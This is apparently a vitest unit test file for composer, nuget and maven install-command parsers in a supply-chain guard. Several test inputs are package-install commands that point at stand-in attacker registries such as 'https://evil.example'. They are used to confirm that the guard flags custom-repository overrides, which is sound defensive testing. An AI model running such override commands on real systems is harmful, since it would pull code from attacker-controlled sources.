// Direct unit tests for the composer / nuget / maven ecosystem parsers
// (added 2026-06-12). End-to-end dispatch through `parseInstallCommands` is
// covered in package-install-parser.test.ts; these pin the per-parser branch
// behavior — verb routing, spec classification, version extraction.

import { describe, expect, it } from "vitest";
import {
	parseComposer,
	parseMaven,
	parseNuget,
} from "./package-install-parser-ecosystems.js";

describe("parseComposer", () => {
	it("parses `require vendor/pkg:version` as a pinned registry add", () => {
		const cmd = parseComposer(["composer", "require", "monolog/monolog:2.9.1"], {});
		expect(cmd?.ecosystem).toBe("composer");
		expect(cmd?.action).toBe("add");
		expect(cmd?.packages).toEqual([
			{ kind: "registry", name: "monolog/monolog", version: "2.9.1" },
		]);
	});

	it("parses `require vendor/pkg` without a version", () => {
		const cmd = parseComposer(["composer", "require", "guzzlehttp/guzzle"], {});
		expect(cmd?.packages).toEqual([{ kind: "registry", name: "guzzlehttp/guzzle" }]);
	});

	it("keeps a range constraint as the version (gate flags it later)", () => {
		const cmd = parseComposer(["composer", "require", "vendor/pkg:^1.2"], {});
		expect(cmd?.packages[0]).toMatchObject({ name: "vendor/pkg", version: "^1.2" });
	});

	it("flags a custom --repository", () => {
		const cmd = parseComposer(["composer", "require", "--repository", "vendor/pkg:1.0.0"], {});
		expect(cmd?.customRegistry).toBe("custom");
	});

	it("flags a custom --repository=<repo> (the = form — was a bypass)", () => {
		const cmd = parseComposer(
			["composer", "require", "--repository=https://evil.example", "monolog/monolog:2.9.1"],
			{},
		);
		expect(cmd?.customRegistry).toBe("custom");
	});

	it("treats install as a lockfile sync and update as a manifest sync", () => {
		expect(parseComposer(["composer", "install"], {})).toMatchObject({
			action: "sync",
			fromLockfile: true,
			fromManifest: true,
		});
		expect(parseComposer(["composer", "update"], {})).toMatchObject({
			action: "sync",
			fromLockfile: false,
		});
	});

	it("treats remove as a no-supply-chain uninstall", () => {
		expect(parseComposer(["composer", "remove", "vendor/pkg"], {})).toMatchObject({
			action: "remove",
		});
	});

	it("returns null for non-install verbs", () => {
		expect(parseComposer(["composer", "dump-autoload"], {})).toBeNull();
	});
});

describe("parseNuget", () => {
	it("parses `dotnet add package Name --version V`", () => {
		const cmd = parseNuget(
			"dotnet",
			["dotnet", "add", "package", "Newtonsoft.Json", "--version", "13.0.1"],
			{},
		);
		expect(cmd?.ecosystem).toBe("nuget");
		expect(cmd?.packages).toEqual([
			{ kind: "registry", name: "Newtonsoft.Json", version: "13.0.1" },
		]);
	});

	it("parses `dotnet add <proj> package Name` (package keyword not first)", () => {
		const cmd = parseNuget("dotnet", ["dotnet", "add", "App.csproj", "package", "Serilog"], {});
		expect(cmd?.packages).toEqual([{ kind: "registry", name: "Serilog" }]);
	});

	it("reads --version=V (equals form)", () => {
		const cmd = parseNuget(
			"dotnet",
			["dotnet", "add", "package", "X", "--version=1.2.3"],
			{},
		);
		expect(cmd?.packages[0]).toMatchObject({ version: "1.2.3" });
	});

	it("treats dotnet restore as a manifest sync", () => {
		expect(parseNuget("dotnet", ["dotnet", "restore"], {})).toMatchObject({
			action: "sync",
			fromLockfile: true,
		});
	});

	it("parses `nuget install Name -Version V`", () => {
		const cmd = parseNuget("nuget", ["nuget", "install", "Moq", "-Version", "4.20.70"], {});
		expect(cmd?.packages).toEqual([{ kind: "registry", name: "Moq", version: "4.20.70" }]);
	});

	it("flags a custom --source", () => {
		const cmd = parseNuget(
			"nuget",
			["nuget", "install", "X", "-Version", "1.0.0", "--source", "https://evil"],
			{},
		);
		expect(cmd?.customRegistry).toBe("https://evil");
	});

	it("flags a custom -Source <url> (nuget single-dash flag — was a bypass)", () => {
		const cmd = parseNuget(
			"nuget",
			["nuget", "install", "Moq", "-Version", "4.20.70", "-Source", "https://evil.example"],
			{},
		);
		expect(cmd?.customRegistry).toBe("https://evil.example");
	});

	it("returns null for non-install dotnet/nuget verbs", () => {
		expect(parseNuget("dotnet", ["dotnet", "build"], {})).toBeNull();
		expect(parseNuget("dotnet", ["dotnet", "add", "App.csproj"], {})).toBeNull();
		expect(parseNuget("nuget", ["nuget", "list"], {})).toBeNull();
	});
});

describe("parseMaven", () => {
	it("parses `mvn dependency:get -Dartifact=g:a:v`", () => {
		const cmd = parseMaven(
			["mvn", "dependency:get", "-Dartifact=org.apache.commons:commons-lang3:3.14.0"],
			{},
		);
		expect(cmd?.ecosystem).toBe("maven");
		expect(cmd?.packages).toEqual([
			{ kind: "registry", name: "org.apache.commons:commons-lang3", version: "3.14.0" },
		]);
	});

	it("handles a 2-part coordinate (no version)", () => {
		const cmd = parseMaven(["mvn", "dependency:get", "-Dartifact=group:artifact"], {});
		expect(cmd?.packages).toEqual([{ kind: "registry", name: "group:artifact" }]);
	});

	it("returns an add with no packages when -Dartifact is absent", () => {
		const cmd = parseMaven(["mvn", "dependency:get"], {});
		expect(cmd?.packages).toEqual([]);
	});

	it("returns null for build-lifecycle goals", () => {
		expect(parseMaven(["mvn", "install"], {})).toBeNull();
		expect(parseMaven(["mvn", "clean", "package"], {})).toBeNull();
	});

	it("flags -DremoteRepositories as a custom registry (so the guard blocks the override)", () => {
		const cmd = parseMaven(
			[
				"mvn",
				"dependency:get",
				"-Dartifact=org.foo:bar:1.0.0",
				"-DremoteRepositories=https://evil.example/repo",
			],
			{},
		);
		// Without this, an allowlisted+pinned coordinate would still be pulled from
		// the attacker's repo — the custom-registry block must fire (finding 2026-06).
		expect(cmd?.customRegistry).toBe("custom");
	});

	it("flags the legacy -DrepositoryUrl / -DrepoUrl repo overrides too", () => {
		expect(
			parseMaven(
				["mvn", "dependency:get", "-Dartifact=g:a:1.0.0", "-DrepositoryUrl=https://evil.example"],
				{},
			)?.customRegistry,
		).toBe("custom");
		expect(
			parseMaven(
				["mvn", "dependency:get", "-Dartifact=g:a:1.0.0", "-DrepoUrl=https://evil.example"],
				{},
			)?.customRegistry,
		).toBe("custom");
	});

	it("leaves customRegistry unset for a plain dependency:get (default repo)", () => {
		const cmd = parseMaven(["mvn", "dependency:get", "-Dartifact=g:a:1.0.0"], {});
		expect(cmd?.customRegistry).toBeUndefined();
	});
});
